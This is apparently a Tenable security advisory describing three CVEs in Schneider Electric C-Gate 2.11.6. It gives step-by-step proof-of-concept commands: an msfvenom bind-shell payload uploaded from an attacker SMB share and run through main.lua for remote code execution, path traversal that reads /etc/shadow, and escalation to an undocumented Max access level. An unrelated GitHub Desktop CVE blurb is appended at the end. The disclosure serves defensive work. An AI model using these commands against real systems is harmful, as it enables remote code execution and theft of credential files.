# Schneider Electric C-Gate Multiple Vulnerabilities

High

[← View More Research Advisories](/security/research)
### Synopsis

Tenable found multiple vulnerabilities in the C-Gate 2.11.6.
#### 1) CVE-2021-22796 - Authenticated main.lua File Upload RCE

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

The following demonstrates how an authenticated user with C-Gate Admin access level can upload a malicious executable file to the C-Gate Windows host and run the executable as Network Service. For C-Gate versions prior to 2.11.6 (comes with CBusToolkit 1.15.8), the uploaded executable is run as SYSTEM.

**The C-Gate server implements a LUA RUN command:**
```

help LUA
101-Help: LUA commands:
101-Help:  LUA ? Help for these commands
101 Help:  LUA RUN - Run main.lua

```
**The command runs the main.lua file located in the lua sub directory in the current directory:**
```

(hr = new hR()).a = new hT("lua", "main.lua");

```
**The attacker can perform the following steps to achieve RCE:**
**Create a malicious exe (i.e., tcp\_bind\_shell.exe):**
```

msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -f exe -o /tmp/tcp_bind_shell.exe

```
**Create main.lua:**
```

echo -ne 'os.execute("lua\\\\tcp_bind_shell.exe")' > /tmp/main.lua

```
**Setup an SMB server on attacker's host to serve tcp\_bind\_shell.exe and main.lua:**
```

smbserver.py myshare /tmp

```
**Login with a user that has Admin access level:**
```

nc  20023
201 Service ready: Clipsal C-Gate Version: v2.11.6 (build 3271) #cmd-syntax=1.0
LOGIN admin aaa
211 Access level set to: Admin

```
**Escalate to Max access level so that FILE commands can be run:**
```

ACCESS ADD user attacker aaa Max
200 OK.
LOGIN attacker aaa
211 Access level set to: Max

```
**Create the lua directory in the current directory (Default:C:\Clipsal\C-Gate2):**
```

FILE MKDIR lua
200 OK.

```
**Set project archive directory to lua so that the attacker-controlled files are dropped to this directory:**
```

CONFIG GET project.default.archive-dir
303 project.default.archive-dir=tag/archived
CONFIG SET project.default.archive-dir lua
200 OK.

```
**Upload a malicious exe (i.e., tcp\_bind\_shell.exe) to the lua directory:**
```

PROJECT RESTORE exe \\\\\myshare\tcp_bind_shell.exe
200 OK.
PROJECT ARCHIVE exe tcp_bind_shell.exe
200 OK.

```
**Upload attacker-controlled main.lua, which contains single line: os.execute("lua\\tcp\_bind\_shell.exe"):**
```

PROJECT RESTORE lua \\\\\myshare\main.lua
200 OK.
PROJECT ARCHIVE lua main.lua
200 OK.

```
**Run the attacker-controlled main.lua:**
```

LUA RUN

```
#### 2) CVE-2021-22720 - PROJECT RESTORE Incomplete Fix

CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

An authenticated attacker with C-Gate Admin access level can read sensitive files using the PROJECT RESTORE and FILE DOWNLOAD commands. The following shows the attacker is able to download /etc/shadow on a Linux system on which the C-Gate server is running as root.

**Login with a user that has Admin access level:**
```

nc  20023
201 Service ready: Clipsal C-Gate Version: v2.11.6 (build 3271) #cmd-syntax=1.0
LOGIN admin aaa
211 Access level set to: Admin

```
**Escalate to Max access level so that FILE commands can be run:**
```

ACCESS ADD user attacker aaa Max
200 OK.
LOGIN attacker aaa
211 Access level set to: Max

```
**Copy /etc/shadow to project directory:**
```

PROJECT RESTORE shadow ../../../../../../../../../../../../etc/shadow
200 OK.

```
**Determine the project directory path:**
```

CONFIG GET project.default.dir
303 project.default.dir=tag/

```
**List project files in the project directory:**
```

FILE LS tag
304-directory="/work/schneider/cgate/unpacked/cgate/tag" files=3
305-name="EXAMPLE.xml" size=77744 modified=Tue Jul 05 21:21:38 UTC 2016

305 name="SHADOW.xml" size=1116 modified=Sat May 25 05:23:20 UTC 2021

```
**Download /etc/shadow (contents base64 encoded):**
```

```
All PoCs use Kali Linux as attacker's host, where Metasploit and python-impacket (for smbserver.py) are installed.
#### 3) Access Level Escalation - CVE-2021-22784

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N

A user with C-Gate Admin access level can add a user with a higher level and then logs in as that user to gain a higher access level. This allows an authenticated attacker to run more privileged commands that are not allowed at the Admin level.

According to the C-Gate documentation (CGateManual.pdf), access levels are as follows, with each later level incorporating the functions of the previous level:
```

None    - no access at all. Use this to refuse connections.
Connect - allow a connection to be established (to the command interface only) and execute the LOGIN command or the license challenge & response commands.
Monitor - allow monitoring and query of the status of objects and C-Bus, but do not allow any changes
Operate - allow set, on, off, ramp operations – allow changes to be made to the system
Admin   - allow C-Gate shutdown and administration functions
Program - allow C-Bus networks to be programmed
Debug   - allow debugging functions to be performed

```
In addition, undocumented access levels Clipsal and Max are defined in cgate.jar, and these two access levels are higher than the Debug level:
```

private static String[] m = new String[] { "None", "Connect", "Monitor", "Operate", "Admin", "Program", "Debug", "Clipsal", "Max" };

```
The following shows a scenario of access level escalation:

* A remote user connects to the C-Gate server command port. Initially, the user has Connect access level. So he cannot run the FILE command.
* The user logs in as a user (admin) that has Admin access level. He still cannot run the FILE command at the Admin level.
* The user adds a user (attacker) with Max access level and logs in as that user. Now he can run the FILE command.

```

nc  20023
201 Service ready: Clipsal C-Gate Version: v2.11.6 (build 3271) #cmd-syntax=1.0
LOGIN
210 Access level: Connect
FILE
420 Access denied.
LOGIN admin aaa
211 Access level set to: Admin
FILE
420 Access denied.
ACCESS ADD user attacker aaa Max
200 OK.
LOGIN attacker aaa
211 Access level set to: Max
FILE
101-Help: FILE commands:
101-Help:  FILE ? Help for these commands
101-Help:  FILE DELETE - Remove a file or directory from the server
101-Help:  FILE DIR - Return a list of directory contents for the given directory
101-Help:  FILE DOWNLOAD - Download a copy of a file as a base-64 encoded chunk of data
101-Help:  FILE LS - Return a list of directory contents for the given directory
101-Help:  FILE MD5 - Calculate an MD5 hash of a local filename on the server
101-Help:  FILE MKDIR - Return a list of directory contents for the given directory
101 Help:  FILE UPLOAD - Upload  a file to the server as a base-64 encoded chunk of data

```

* ##### [CVE-2025-23040](https://www.tenable.com/cve/CVE-2025-23040)

  ###### medium

  GitHub Desktop is an open-source Electron-based GitHub app designed for git development. An attacker convincing a user to clone a repository directly or through a submodule can allow the attacker access to the user's credentials through the use of maliciously crafted remote URL. GitHub Desktop relies on Git to perform all network related operations (such as cloning, fetching, and pushing). When a user attempts to clone a repository GitHub Desktop will invoke `git clone` and when Git encounters a remote which requires authentication it will request the credentials for that remote host from GitHub Desktop using the git-credential protocol. Using a maliciously crafted URL it's possible to cause the credential request coming from Git to be misinterpreted by Github Desktop such that it will send credentials for a different host than the host that Git is currently communicating with thereby allowing for secret exfiltration. GitHub username and OAuth token, or credentials for other Git remote hosts stored in GitHub Desktop could be improperly transmitted to an unrelated host. Users should update to GitHub Desktop 3.4.12 or greater which fixes this vulnerability. Users who suspect they may be affected should revoke any relevant credentials.

This software package has an issue that allows for an authentication bypass in some configurations. An attacker would require the ability to access the system as an unprivileged user. Depending on the configuration, the attacker may also need to know the user's password.
